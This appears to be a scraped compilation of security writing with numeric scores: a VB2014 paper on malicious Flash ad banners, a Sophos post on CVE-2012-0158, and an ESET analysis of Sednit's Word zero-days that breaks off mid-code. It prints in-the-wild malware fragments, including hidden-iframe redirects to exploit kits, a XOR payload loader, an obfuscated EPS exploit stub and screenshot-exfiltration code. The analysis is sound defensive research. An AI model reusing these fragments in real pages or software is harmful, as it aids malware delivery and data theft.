The next version of Microsoft Internet Explorer will include a new security check for stack frames and mechanisms for mitigation of attacks that transfer control to a shellcode address (Enhanced Memory Protections in IE10).,0.01504208988073974
"Aleksandr Matrosov, Security Intelligence Team Lead
",0.010083666225937482
"VB2014 paper: Optimized mal-ops. Hack the ad network like a boss
2014-11-18",0.008991736990063726
"Vadim Kotov
Bromium, Inc.
,
USA",0.00959692490224251
"Rahul Kashyap
Bromium, Inc.
,
USA
Editor:
Martijn",0.009516113521511271
"Grooten
Abstract
In their VB2014 paper, Vadim Kotov and Rahul Kashyap perform an in-depth analysis of malicious web ads, with the focus on Flash banners. They investigate various possibilities for an attacker to leverage ad networks to spread malware and showcase the fact that, from the attackers’ perspective, ad networks are no different from, and may be even better than exploit kits.
Copyright © 2014 Virus Bulletin",0.012708500310757431
"Abstract
In this paper we perform in-depth analysis of malicious web ads with the focus on Flash banners. We investigate various possibilities for an attacker to leverage ad networks to spread malware. Then we showcase the fact that, from the attackers’ perspective, ad networks are no different from, and may be even better than exploit kits – thus making them a viable candidate for the next primary attack vector. Finally, we explore how current security technologies are ineffective against attacks propagated through ad networks.",0.013537158679196026
"Introduction
A significant part of the web economy is based on web advertising. Banner networks such as DoubleClick [1] can be seen on most commercial websites and are visited by millions of users every day. By visiting a website, we implicitly allow a number of third-party JavaScript and Flash programs to execute in our browsers, and this raises some huge security concerns.
One of the most popular attack vectors nowadays is drive-by-download – a malicious page serving malware through browser and plug-in exploits. The attack begins when a victim visits a malicious website, from which they are redirected to the exploit kit page. Various methods of redirection are possible: an iframe tag, a JavaScript-based page redirect, etc. The exploit kit page then returns an HTML document containing exploits, which are usually hidden in an obfuscated JavaScript code. If at least one exploit succeeds, the victim is compromised. Successful exploitation means that the injected shellcode has finished flawlessly and hence accomplished its task: to download and execute a malicious program. The key component in this scenario is the redirect page, which is usually a compromised website, spam or a targeted email. Lately, cybercriminals have started using ad networks for this purpose. In this case, one does not actually need to hack a website or bother with spam dissemination. One only needs to use one of the hundreds of web advertising services to reach millions of Internet users.
The problem of malicious ads has been around for a while and there are a handful of papers addressing it. In 2007, Provos et al. included rogue ad networks in their extensive study of web malware [2], but the major focus was the emerging problem of exploit kits. In the 2009 paper by Ford et al. [3], an attempt was made to investigate the problem of malicious Flash banners. The paper is focused on the detection and classification of rogue SWF files and showcases an attack scenario of a malicious ActionScript 2.0 program. Later, a broader theoretical study was conducted by Angelia and Prishva [4], addressing the problem of malvertising. It investigates the different sides of the advertising market and covers several security-related problems, from malware distribution to privacy violation. All of these papers lack a significant number of samples, use cases of malicious adverts, and approach the problem from the defensive perspective. In this paper, we summarize our findings regarding in the-wild Flash banners and look at the properties of ad networks that could be leveraged by an attacker.
Malicious adverts are closely entangled with exploit kits and are used as redirects to the pages serving malware via drive-by-download attacks. The most dangerous type of web ad is a Flash banner. The prevalence of Adobe Flash Player is enormous. According to Adobe statistics [5], as many as one billion Internet users have Adobe’s Flash plug-in running in their browsers. The danger of Flash redirects is that they don’t do anything malicious per se, and therefore it’s extremely hard to detect and block them. In this paper, we demonstrate how ad networks could be deployed for the same purposes as exploit kits, and discuss how a number of exploit kit features could be in fact be ‘outsourced’ to the ad network.",0.022238795665045497
"YouTube case study
We started our investigation with an incident we encountered in February 2014 [6]. A YouTube page was spreading malware though the code presented in the advertising network. The scheme of the attack is presented in Figure 1.
Figure 1. Workflow of the YouTube incident.
Redirection code was found in the SWF file. It leveraged the ExternalInterface API that allows the calling of the JavaScript function from Flash movies. The attack consists of the following steps:
Fingerprint the browser.
If the browser is either Internet Explorer or Opera:
concatenate the obfuscated URL with the obfuscated JavaScript redirect code
call ExternalInterface.call(deobfuscate(<obfuscated redirect code + URL>)).
After de-obfuscation, the following JavaScript code is executed:
function () {
var E = document.createElement(‘iframe’);
document.body.appendChild(E);
var ATR = E.attributes;
var AW = document.createAttribute(‘width’);
AW.nodeValue = ‘0’;
ATR.setNamedItem(AW);
var AH = document.createAttribute(‘height’);
AH.nodeValue = ‘0’;
ATR.setNamedItem(AH);
var AB = document.createAttribute(‘frameborder’);
AB.nodeValue = ‘0’;
ATR.setNamedItem(AB);
var AS = document.createAttribute(‘src’);
AS.nodeValue = ‘<URL serving Styx exploit kit>’;
ATR.setNamedItem(AS);
}",0.014973275901645433
"The code adds an iframe to the DOM layout of the page. In turn, the iframe points to a URL serving an instance of the Styx exploit kit. Together with malicious code, the advertisement also contained the following MouseClick handler so that it could act as a normal web banner:
private function FuncOnClickBan.ner(param1:Event) : void {
navigateToURL(new URLRequest(root.loaderInfo.parameters.clickTAG),”_blank”);
}",0.012694918356009
"To investigate the matter further, we collected and aggregated Google Safe Browsing URL analysis results from 26 March to 1 June 2014 to estimate the rates of malware prevalence on YouTube.com. We assume that, since no compromises of YouTube.com itself have been reported recently, all the malicious content comes from the adverts. Figure 2 shows the percentage of malicious pages of all the pages on YouTube.com checked by the Google crawler.
Figure 2. Percentage of malicious pages on YouTube.com over two months.
We see that the trend is decreasing, however it’s quite a minor change (about 0.015%), and there are spikes from time to time that could indicate the start of malvertising campaigns. Figure 3 shows the categories within the malicious pages (they might overlap since they cover different aspects of attacks).
Figure 3. Categories within malicious pages on YouTube.com.
Interestingly, the results indicate that there are more trojans than exploits and new processes. A possible explanation could be that Google’s engine detects the attack after it has been planted on the victim machine, and thus fails to detect the exploitation stage. Indirectly, this indicates that malware developers pay a lot of attention to scanners and crawler bypasses. Between 7 May and 21 May, the number of scripting exploits dropped, while the number of trojans increased dramatically. This could indicate an overall improvement in malicious content obfuscation (possibly switching from pure HTML/JavaScript code to SWF). This supports the assumption that it is getting harder to detect the exploitation stage.
The number of malicious domains fluctuates slightly, but the trend is pretty much stable, as shown in Figure 4.
Figure 4. Malicious domains and intermediaries.
Statistics show that the incidence of malicious banners on YouTube is low, but stable. From the attacker’s perspective, a video-hosting page is an attractive target since a user stays on the same page for several minutes while watching the video – enough time for long redirects and complex exploits to execute.",0.022367554294459246
"Leveraging ad networks for client fingerprinting
An advertising network is a web service that allows advertisers to display their banners on a variety of websites. Of course, the owners of these websites have mutually beneficial agreements with the advertising agency. Figure 5 shows how all the parties involved interact with each other.
Figure 5. How ad networks work.
The complex and diverse infrastructure of ad networks relies heavily on third-party content such as images, text and rich media (video, Flash animation, etc.). While text and images could hardly be used for attack purposes (unless, say, an image exploits some vulnerability in the image processing part of the browser), rich media provides all the means necessary for attack. The advertising policy does not really place any restrictions on how a banner should operate. An attacker needs only to make sure that it can act as a normal advert in order to get approval from the advertising network.
One of the key features of ad networks is the ability for the advertiser to target certain audience sectors. The biggest ad networks are engaged with search engines, social networks and entertainment portals. Let’s examine DoubleClick’s targeting criteria [7]. It allows selection of audience parameters including:
Language
Country
Browser
Operating system
Device
Topic of the search query or web page.
Similar functionality is usually implemented in exploit kits[8], but in this case it is handled completely by the advertising network. Setting the operating system to Windows XP and the browser to Internet Explorer allows an attacker to use old exploits that are publicly available and always proven to be effective. With this configuration they don’t need to worry about such defences as ASLR, EMET, etc. Language and country parameters allow an attacker to focus on a specific geographical location, which is handy if the attacker has a working scheme of monetizing stolen bank cards or victim personal data in a particular country.",0.015286369765256547
"Attacking from malicious Flash banners
All the exploit kits to date have relied on JavaScript to perform such tasks as browser/plug-in fingerprinting, exploit selection and data obfuscation. Flash is used either to exploit a vulnerability in Adobe Flash Player or to support other exploits in building ROP shellcode [9], [10]. However, in banner networks, Flash movies are the most popular media, and security policies for SWF files are pretty loose. Web advertising involves a number of parties, such as the ad network showing the banners, the websites embedding the ads, and the resources provided and controlled by the advertiser. This, for instance, allows communication between Flash and JavaScript, which was leveraged in the YouTube attack.
In general, there are three ways to attack from a Flash banner advertisement:
Redirect a user to a malicious page after clicking on the banner.
Add a stealthy redirect to the page in the form of an iframe.
Attack from the banner itself.
The general scenario of the attack is presented in Figure 6.
Figure 6. Malicious Flash banner attack scenario.
The URL to which a banner leads is provided to SWF via ClickTag [11] – a parameter specified in HTML. Nowadays, this is a de facto standard for all the major ad networks, but it’s really hard to verify that the URL passed to a Flash movie remains the same and doesn’t get transformed or replaced by a malicious one.
The current version of ActionScript is 3.0, but the older one (2.0) is still in use. Both have sufficient capabilities for user redirects and malicious code execution. The difference between them, from the software development point of view, is that 2.0 was more of a supplement for Flash’s rich media capabilities, while 3.0 is more powerful and is a purely class-based scripting language (pretty much like Java). In fact, you do not have to use Flash IDE at all to do the job (including complex animation, audio and video manipulation) in pure ActionScript 3.0 (AS3).
In AS 2.0, Flash and HTML (JavaScript or VBScript) communication is implemented in the fscommand [12] class. Alternatively, the getUrl function can be used, where instead of a URL, a JavaScript snippet can be passed as an argument:
getUrl(“javascript:n=1;do{window.open(\’http://*******.com/zha.htm\’)}while(n==1); width=1”, “_self”);
In AS3, this is done via the ExternalInterface class [13]. Its method call allows JavaScript functions to be invoked on the HTML page. But as the YouTube case shows, its functionality is not limited to calling the JavaScript functions that are defined explicitly, but it actually executes any arbitrary JS code in the form of function () { <your code> }. This works in Firefox, Internet Explorer and Opera, but doesn’t work in Chrome. It allows an attacker to modify the DOM structure of the HTML page and thus redirect to a drive-by-download or exploit a potential victim straight away. In this case, malicious code is contained within the banner and must therefore be obfuscated in order to pass the security check performed by the corresponding ad network. One of the malvertising samples we saw (md5 = 98b7e6694bca78770d0e8a5c80e3992a) used the class tree to hide the malicious JavaScript code:
if(ExternalInterface.available){
storyByteArray = ByteArray(new storyClass());
story = storyByteArray.readMultiByte(storyByteArray.length,”iso-8859-1”);
if(Capabilities.screenResolutionX >= 600 && Capabilities.screenResolutionY >= 400){
if(Capabilities.os.indexOf(“Windows”) >= 0){
userAgent = ExternalInterface.call(“window.navigator.userAgent.toString”);
if(userAgent.indexOf(“MSIE”) != -1) {
str1 = “function(){“;
str1 = str1 + story;
str1 = str1 + “}”;
ExternalInterface.call(str1);
}
}
}
}",0.021638470093803375
"First, it carefully checks the environment it is running in and makes sure that it’s a Windows system and that the ExternalInterface class is available in the browser. Then it leverages JavaScript to check for the user-agent string. Only when it verifies that the victim is running Internet Explorer does it invoke the JavaScript code. The payload seems to be contained in the story variable, which was initialized in the code snippet shown above – but if we look into storyClass(), we don’t see anything malicious:
public class storyClass extends ByteArrayAsset {
public function Maina_storyClass() {
super();
}
}",0.008854638295771045
"However, the class inherits ByteArrayAsset – a class which allows the embedding of binary data into an SWF. Furthermore, when the instance of the storyClass is concatenated with the str1 string, it is coded implicitly into the string and returns the binary data in the superclass. The binary data turns out to be a fairly large chunk of obfuscated JavaScript. The JavaScript (after de obfuscation) contains a browser fingerprinting part based on PluginDetect. Then, if a victim uses the required version of JRE, it adds an iframe to the page:
if (((J.indexOf(‘1.6.0.’) !== -1) || (J.indexOf(‘1.7.0.’) !== -1)) && (J != ‘0.0.0.0’) && (J != ‘1.7.0.25’) && (J != ‘1.7.0.40’) && (J != ‘1.7.0.45’)) {
var versions = bin2hex(pdfvers + ‘||’ + J + ‘||’ + flashvers + ‘||’ + group);
var namef = h + ‘tp://*******.net/’;
var divTag = document.createElement(‘div’);
divTag.id = ‘over-holder’;
document.body.appendChild(divTag);
var fr3 = document.createElement(‘iframe’);
fr3.width = ‘11px’;
fr3.height = ‘9px’;
fr3.setAttribute(‘style’, ‘left:-10000px’);
fr3.setAttribute(‘style’, ‘visibility:hidden’);
fr3.setAttribute(‘src’, namef);
document.getElementById(‘over-holder’).appendChild(fr3)
}",0.013329313246911334
"Later, we discovered an updated version of this attack (md5= 9edb3fdeb9bb38fcbf1a8432ff4559a2). Neither the commercial Sothink SWF Decompiler nor the open-source JPEXS Free Flash Decompiler were able to decompile it. But by looking at the AS3.0 byte code we were able to spot the same variable names and workflow as in the previous case. However, this one also targeted Firefox and Opera users:
00232) + 0:2 getlex <q>[packageinternal]::userAgent
00233) + 1:2 pushstring “Firefox”
00234) + 2:2 callproperty <q>[namespace]http://adobe.com/AS3/2006/builtin::indexOf, 1 params
00235) + 1:2 pushbyte -1
00236) + 2:2 equals
…
00250) + 0:2 getlex <q>[packageinternal]::userAgent
00251) + 1:2 pushstring “Opera”
00252) + 2:2 callproperty <q>[namespace]http://adobe.com/AS3/2006/builtin::indexOf, 1 params
00253) + 1:2 pushbyte -1
00254) + 2:2 equals",0.011918495013079511
"Another difference was that the JavaScript contained a number of unprintable characters, which is a primitive but quite effective method of obfuscation:
00000000  4f 3d 22 2f 69 29 2e 49  28 62 03 3a 42 28 62 29  |O=”/i).I(b.:B(b)|
00000010  7b 03 79 20 61 7d 2c 03  29 7b 43 20 03 3b 77 28  |{.y a},.){C .;w(|
00000020  03 2e 31 03 02 73 2a 28  02 02 64 03 2b 2b 29 7b  |..1..s*(..d.++){|",0.01150289875726973
"Although it doesn’t have a native eval function, as JavaScript does, allowing execution of the source code passed as an argument, there is a way to obfuscate a Flash movie within a Flash movie. To do that the ByteArray and Loader classes are usually employed. The former class provides a means to store and manipulate binary data, while the latter allows it to be encapsulated into an AS3 object and added into the context of the current program.
Consider the following example code taken from a piece of SWF malware:
key = 6301633;
payload = new Array(171143298, 6304480, 1478360505, … ); 3
bytes = new ByteArray();
bytes.endian = Endian.LITTLE_ENDIAN;
for(var i:int = 0; i < payload.length; i++)
bytes.writeUnsignedInt(payload[i] ^ key);",0.013875698302580064
"bytes.length = 3344;
ldr_context = new LoaderContext();
loader = new Loader();
loader.contentLoaderInfo.addEventListener(Event.COMPLETE,this.vets);
loader.loadBytes(bytes, ldr_context);",0.018762370144421614
"The code above sets up a byte array, de-obfuscates the payload, and makes the instance of the Loader class load it as if it was an image or another SWF movie. Then it registers the callback function this.vets() to be called once the loader has finished loading. In the this.vets() function, the loaded element is added to the stage:
public function vets(param1:Event) : void {
addChild(param1.target.loader as Loader);
}",0.013739138625596614
"After that, a new Flash object is created and all the code contained therein is executed.
The problem with attacking from the Flash banner directly is that there are size constraints defined by the ad network, which are usually up to 200K. The banner must look normal and should not contain any suspicious elements such as a huge chunk of high-entropy data. This constraint can be overcome by deploying steganography and hiding malicious code in the image. The AS3 code could then extract it and execute it in the manner shown above. For that purpose, for example, the hideimage [14] tool could be used. Although it’s a C program, it’s pretty small and straightforward, so it would be trivial to implement in ActionScript 3.0. Adobe Flash provides rich capabilities for image manipulation [15], including reading and writing pixel data.
Although we haven’t yet seen malicious banners that incorporate a fully functional exploit kit, it is a possibility, especially considering the targeted character of web ads.",0.015811445951851022
"Summary and conclusion
From our investigation we conclude that ad networks could be leveraged to aid, or even be substituted for current exploit kits. Loose security policies, high prevalence and powerful scripting capabilities make it a viable tool for malware distribution.
There are a number of reasons why the problem of malvertising cannot be solved by traditional means. To name a few:
In terms of both time and resources (and hence money), the scale of web advertising is too large to allow a thorough check of every single piece of rich media.
Verifying that a file is malicious or clean is a form of the Halting Problem and thus every check is probabilistic. Furthermore, to really impact the security of web ads, the detection algorithm success rate must be higher than the percentage of malware in advertising (which, according to Google Safe Browsing, is about 0.04%) and provide a negligible rate of false alarms.
In some cases, malicious content could be triggered by a certain condition and thus not manifest any suspicious behaviour under normal circumstances, thus passing the security checks. To discover such content, thorough static analysis is required (such as symbolic execution and taint analysis), which could be complicated given the volume of web adverts.
The most popular security solutions nowadays are based on end point detection, but this is largely ineffective due to the obfuscation capabilities of ActionScript. To back up this claim we checked several not-so-fresh malicious SWF files from our collection with VirusTotal. The results are shown in Table 1.
MD5
AS version
VirusTotal positives
Scan date
196e889522da0964f8e148414f3cc0c
3.0
1/50
2014-02-09
98b7e6694bca78770d0e8a5c80e3992a
3.0
5/48
2014-02-27
75d155554330c93287cc7c4dc96a6631
2.0
29/46
2013-05-30
ffe764f6e5e8aec6d7c73de83d862b25
3.0
1/49
2014-02-09
5205d33eb5d8db897c691b8d081d5ad0
3.0
2/52
2014-05-20
Table 1. VirusTotal results for several malicious banners.
Although VirusTotal does not cover the proactive modules of anti-virus engines, the signature-based approach clearly fails here.
A viable solution could be to block the ads at endpoints. Tools such as AdBlock allow users to do this. However, this would damage a huge sector of the web economy. It appears that at the current time, we need to focus our efforts on the detection and blocking of actual exploits. This, however, does not change the fact that legacy approaches for malware detection cannot cope with the ever-growing threat landscape.",0.015883636537339152
"Bibliography
[1] DoubleClick. http://www.google.com/doubleclick/.
[2] Provos, N.; McNamee, D.; Mavrommatis, P.; Wang, K.; Modadugu, N. The ghost in the browser: analysis of web-based malware. Proceedings of HotBots’07, 2007. https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/provos/provos.pdf.
[3] Ford, S. Analyzing and Detecting Malicious Flash Advertisements. Proceedings of ACSAC’09, 2009, pp.263–372. http://www.cs.ucsb.edu/~chris/research/doc/acsac09_flash.pdf.
[4] Angelia; Pishva, D. Online advertising and its security and privacy concerns. Proceedings of ICACT’13, 2013, pp.372–377. http://infoscience.epfl.ch/record/184961/files/EPFL_TH5664.pdf.
[5] Adobe Flash runtimes/Statistics. http://www.adobe.com/products/flashruntimes/statistics.html.
[6] Navaraj, M. The Wild Wild Web: YouTube ads serving malware. http://labs.bromium.com/2014/02/21/the-wild-wild-web-youtube-ads-serving-malware/.
[7] About Targeting Criteria – Doubleclick for Publishers Help. https://support.google.com/dfp_premium/answer/177383?hl=en.
[8] Kotov, V.; Massacci, K. Anatomy of Exploit Kits.Proceedings of ESSoS’13. http://securitylab.disi.unitn.it/lib/exe/fetch.php?media=kotov_massacci_anatomy_of_exploit_kits_wp.pdf.
[9] Kotov, V. Dissecting the newest IE10 0-day exploit (CVE-2014-0322). http://labs.bromium.com/2014/02/25/dissecting-the-newest-ie10-0-day-exploit-cve-2014-0322/.
[10] Running in the wild, not for so long. http://blogs.technet.com/b/srd/archive/2013/07/10/running-in-the-wild-not-for-so-long.aspx.
[11] Tracking Macromedia Flash Movies. http://www.adobe.com/resources/richmedia/tracking/designers_guide/.
[12] Fscommand – Adobe Help Resource Center. http://help.adobe.com/en_US/AS2LCR/Flash_10.0/help.html?content=00000561.html.
[13] ExternalInterface – AS3. ActionScript 3.0 Reference for Adobe Flash Platform. http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html.
[14] Stanley, J. Hideimage. http://incoherency.co.uk/tools/hideimage.php.
[15] Chapter 22. Working with bitmaps. Programming Adobe ActionScript 3.0, pp.474–484, 2009. http://help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/flash_as3_programming.pdf.
",0.018184957452440753
"“The Word bug that just won’t die”:  CVE-2012-0158, the cybercrime gift that keeps on taking…",0.009850441089123696
"Written by
Editor",0.007990427730288352
"July 01, 2016",0.00879183798487082
Products & Services Threat Research CVE-2012-0158 Microsoft Office SophosLabs vulnerability,0.007557301677611483
"Arguably one of the most exploited Microsoft Office vulnerabilities of the last decade, CVE-2012-0158’s longevity is one of constant adaptation. Ever since its disclosure in 2012, this vulnerability has been the attack vector of choice for exploitation by attackers who seek to hijack Microsoft Word or Excel and force these programs to execute malicious code.
In fact, according to SophosLabs research, as late as Q4 2015, CVE-2012-0158 was still used by 48% of exploits specifically targeting Office documents.
In this new research paper, Graham Chantry of SophosLabs provides a deep dive into several exploits found in the wild and how they work using CVE-2012-0158.",0.011610340254972873
"This paper also investigates why this vulnerability has been so persistent and popular for the past four years, and theorizes about its possible longevity. The good news for most of us is that the number of computers still vulnerable to this attack is dwindling worldwide, especially as Office releases new updates, and more computers are patched and upgraded to defend against this specific vulnerability.
Our researchers dissect all aspects of this vulnerability in this new research paper: how it works, why it’s been so popular, how it’s changed form, who it’s most commonly utilized against and what the future holds for it.
You can download the paper, as well as all our other SophosLabs research, on our technical papers page.",0.011503178121324842
"About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
You can find our industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter, follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.031685910172434606
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Sednit adds two zero‑day exploits using ‘Trump’s attack on Syria’ as a decoy
Sednit is back - this time with two more zero-day exploits embedded in a phishing email titled Trump's_Attack_on_Syria_English.docx.",0.01381322408388952
ESET Research,0.009387999064506491
9 May 2017 - 08:00PM,0.011039640638241699
Sednit is back – this time with two more zero-day exploits embedded in a phishing email titled Trump’s_Attack_on_Syria_English.docx.,0.010663911824031924
Introduction,0.012036720276026314
"The Sednit group, also known as APT28, Fancy Bear and Sofacy, is a group of attackers operating since at least 2004 and whose main objective is to steal confidential information from specific targets. In October 2016, ESET published an extensive analysis of Sednit’s arsenal and tactics in a whitepaper titled En Route with Sednit.",0.01655479357318712
"Last month, Sednit came in the light again, allegedly interfering with the French elections and more precisely going after the frontrunner Emmanuel Macron. In the same time period, a phishing email containing an attachment named Trump’s_Attack_on_Syria_English.docx caught our attention.",0.014740576391395588
"Analysis of the document revealed its end goal: dropping Sednit’s well-known reconnaissance tool, Seduploader. To achieve this, Sednit used two zero-day exploits: one for a Remote Code Execution vulnerability in Microsoft Word (CVE-2017-0262) and one for a Local Privilege Escalation in Windows (CVE-2017-0263). ESET reported both vulnerabilities to Microsoft, who today released patches during the regular Patch Tuesday schedule.",0.013979791817708476
This blogpost describes the attack itself and the vulnerabilities used to infect its potential targets.,0.014613080901405562
From a Word exploit to Seduploader Dropper,0.00839747387098766
The graphic below shows that this specific attack is totally in line with Sednit’s usual attack methods: the use of a spearphishing email containing a malicious attachment to install a known first-stage payload.,0.011880268319790499
"This time, the phishing email was related to Trump’s attack on Syria.",0.015329541534781832
"The infected attachment is a decoy document containing a verbatim copy of an article titled “Trump’s Attack on Syria: Wrong for so Many Reasons” published on April 12, 2017 in The California Courier:",0.010892242413801045
This is where the attack becomes interesting. The decoy document contains two exploits allowing the installation of Seduploader. See the schema below for an overview.,0.008439037932712723
"These two exploits can be added to the list of zero-day vulnerabilities used by Sednit over the last 2 years, as shown in this timeline:",0.013925782902789452
"Once opened, the decoy document first triggers CVE-2017-0262, a vulnerability in the EPS filter in Microsoft Office. In this case, the malicious EPS file is called image1.eps within the .docx file:",0.011687787259006766
"$ file Trump\'s_Attack_on_Syria_English.docx
Trump's_Attack_on_Syria_English.docx: Zip archive data, at least v2.0 to extrac2
$ unzip Trump\'s_Attack_on_Syria_English.docx
Archive: Trump’s_Attack_on_Syria_English.docx
inflating: [Content_Types].xml
inflating: docProps/app.xml
inflating: docProps/core.xml
inflating: word/document.xml
inflating: word/fontTable.xml
inflating: word/settings.xml
inflating: word/styles.xml
inflating: word/webSettings.xml
inflating: word/media/image1.eps
inflating: word/theme/theme1.xml
inflating: word/_rels/document.xml.rels
inflating: _rels/.rels",0.014446508777201328
12345678910111213141516,0.00932301855283102
"$ file Trump\'s_Attack_on_Syria_English.docxTrump's_Attack_on_Syria_English.docx: Zip archive data, at least v2.0 to extrac2$ unzip Trump\'s_Attack_on_Syria_English.docxArchive: Trump’s_Attack_on_Syria_English.docx inflating: [Content_Types].xml inflating: docProps/app.xml inflating: docProps/core.xml inflating: word/document.xml inflating: word/fontTable.xml inflating: word/settings.xml inflating: word/styles.xml inflating: word/webSettings.xml inflating: word/media/image1.eps inflating: word/theme/theme1.xml inflating: word/_rels/document.xml.rels inflating: _rels/.rels",0.01467266334351991
"$ file word/media/image1.eps
word/media/image1.eps: PostScript document text conforming DSC level 3.0",0.010099662323963199
12,0.014166908958199165
$ file word/media/image1.epsword/media/image1.eps: PostScript document text conforming DSC level 3.0,0.009844916991105568
The EPS exploit file is obfuscated by a simple XOR. EPS provides the functionality to XOR variables and evaluate source (exec). The key used here is 0xc45d6491 on a big hex-encoded string and exec is called on the decrypted buffer.,0.013185811642422829
"$ cat word/media/image1.eps
%!PS-Adobe-3.0
%%BoundingBox:   36   36 576 756
%%Page: 1 1
/A3{ token pop exch pop } def /A2  def /A4{ /A1 exch def 0 1 A1 length 1 sub { /A5 exch def A1 A5 2 copy get A2 A5 4 mod get xor put } for A1 } def <bf7d4bd9[...]b97d44b1> A4 A3 exec quit",0.014425851617133056
12345678,0.008700632467063985
$ cat word/media/image1.eps%!PS-Adobe-3.0 %%BoundingBox:   36   36 576 756 %%Page: 1 1 /A3{ token pop exch pop } def /A2  def /A4{ /A1 exch def 0 1 A1 length 1 sub { /A5 exch def A1 A5 2 copy get A2 A5 4 mod get xor put } for A1 } def <bf7d4bd9[...]b97d44b1> A4 A3 exec quit,0.01399084531799255
"Once decrypted, the exploit looks very similar to the one which was well documented by FireEye in 2015. The vulnerability used at the time was CVE-2015-2545. The main difference is highlighted in the following block, which is how it performs the memory corruption with the forall instruction.",0.009624950636841989
"[...]
500 {
A31 589567 string copy pop
} repeat
1 array 226545696 forall
/A19 exch def
[...]",0.015636994559528494
1234567,0.008430286247751106
[...]500 {    A31 589567 string copy pop} repeat1 array 226545696 forall/A19 exch def[...],0.015487474130967294
"Once code execution is obtained, it loads a shellcode that retrieves some undocumented Windows APIs such as NtAllocateVirtualMemory, NtFreeVirtualMemory and ZwProtectVirtualMemory",0.01338244307383063
"[...]
v1 = (*(__readfsdword(0x30u) + 12) + 12);
v2 = v1-&gt;InLoadOrderModuleList.Flink;
[...]
for ( addr_user32 = 0; v2 != v1; v135 = v2 )
{
v3 = *(v2 + 48);
v132 = *(v2 + 44);
if ( v3 )
{
v4 = *v3;
v5 = 0;
v6 = 0;
if ( *v3 )
{
do
{
if ( v132 &amp;&amp; v6 &gt;= v132 )
break;
if ( (v4 - 0x41) &lt;= 0x19u )
v4 += 0x20;
v2 = v135;
v7 = __ROL4__(v5, 7);
++v3;
v5 = v4 ^ v7;
v4 = *v3;
++v6;
}
while ( *v3 );
v1 = v133;
}
switch ( v5 )
{
case kernel32:
addr_kernel32 = *(v2 + 24);
break;
case ntdll:
addr_ntdll = *(v2 + 24);
break;
case user32:
addr_user32 = *(v2 + 24);
break;
}
}
[...]",0.01359063478468081
123456789101112131415161718192021222324252627282930313233343536373839404142434445,0.011379728179095161
"[...] v1 = (*(__readfsdword(0x30u) + 12) + 12); v2 = v1-&gt;InLoadOrderModuleList.Flink; [...] for ( addr_user32 = 0; v2 != v1; v135 = v2 ) {   v3 = *(v2 + 48);   v132 = *(v2 + 44);   if ( v3 )   {     v4 = *v3;     v5 = 0;     v6 = 0;     if ( *v3 )     {       do       {         if ( v132 &amp;&amp; v6 &gt;= v132 )           break;         if ( (v4 - 0x41) &lt;= 0x19u )           v4 += 0x20;         v2 = v135;         v7 = __ROL4__(v5, 7);         ++v3;         v5 = v4 ^ v7;         v4 = *v3;         ++v6;       }       while ( *v3 );       v1 = v133;     }     switch ( v5 )     {       case kernel32:         addr_kernel32 = *(v2 + 24);         break;       case ntdll:         addr_ntdll = *(v2 + 24);         break;       case user32:         addr_user32 = *(v2 + 24);         break;       }     }[...]",0.01359063478468081
"After more decryption, the Seduploader Dropper is then loaded and executed. Note that all this execution happens within the WINWORD.EXE process running with the current user’s privileges.",0.010949229432640428
Seduploader Dropper,0.0076131164831355624
Seduploader is made up of two distinct components: a dropper and a persistent payload (see page 27 of our En Route with Sednit whitepaper).,0.018148823066667097
"While the dropper used in this attack has evolved since the last version we analyzed, its end goal remains the same: to deliver the Seduploader Payload. This new version of the dropper now contains code to integrate the LPE exploit for CVE-2017-2063. The detailed analysis of this vulnerability can be found in the next section of the blog; for now, we will focus on Seduploader.",0.011228641522982197
"First, the new code in the dropper checks if the process is running on a 32-bit or 64-bit version of Windows. Depending of the result, the correct exploit version will be loaded in memory.",0.012340685167575804
"[...]
if ( Is64Process() == 1 )
{
addr_exploit = exploit_64b;
size_exploit = 0x2E00;
}
else
{
addr_exploit = exploit_32b;
size_exploit = 0x2400;
}
[...]",0.01858460877164647
123456789101112,0.009272463593147706
[...] if ( Is64Process() == 1 ) {     addr_exploit = exploit_64b;     size_exploit = 0x2E00; } else {     addr_exploit = exploit_32b;     size_exploit = 0x2400; }[...],0.01858460877164647
"Once the exploit is successfully executed, Seduploader Dropper will reload itself in WINWORD’s memory space and call CreateRemoteThread with the address of the UpLoader entry point, which will execute the code in charge of installing the Seduploader Payload. This code will run with System privileges, thanks to the exploit.",0.010107203630647543
Seduploader Payload,0.007935546272738403
"Seduploader Payload is a downloader used by Sednit’s operators as reconnaissance malware and is composed of two parts. The first is responsible for injecting the second part in the proper process, depending on whether it is loaded in the WINWORD.EXE process or not. The second part is the downloader itself.",0.011755159757991573
"If Seduploader is running in WINWORD.EXE, its first part will create a mutex named flPGdvyhPykxGvhDOAZnU and open a handle to the current process. That handle will be used to allocate memory and write in it the code of the second part of the Payload component, which will then be executed by a call to CreateRemoteThread. Otherwise, if it is not running in WINWORD.EXE, Seduploader will use CreateThread to launch its second part.",0.011828498690166112
"The downloader contains the usual Seduploader functions and strings encryption algorithm. However, it contains a certain number of changes that we describe below.",0.009947616532461345
"First, the hashing algorithm used to identify DLL names and API functions to resolve was replaced by a new one. The attentive readers of our whitepaper will recall that the old hashing algorithm was strongly inspired from code found in Carberp. Well, the new algorithm was also not created from scratch: this time, Sednit used code very similar to PowerSniff.",0.02126574844511342
"Next, a new img tag was added in Seduploader’s report message. This tag allows the exfiltration of screenshots:",0.010757887892051343
"[...]
keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY, 0u);
Sleep(1000u);
keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0u);
OpenClipboard(0u);
hData = GetClipboardData(CF_BITMAP);
CloseClipboard();
if ( !hData )
return 0;
GdiplusStartupInput = (const int *)1;
v10 = 0;
v11 = 0;
v12 = 0;
GdiplusStartup(&token, &GdiplusStartupInput, 0);
if ( fGetEncoderClsid((int)L""image/jpeg"", &imageCLSID) )
{
v4 = sub_10003C5F((int)hData, 0);
ppstm = 0;
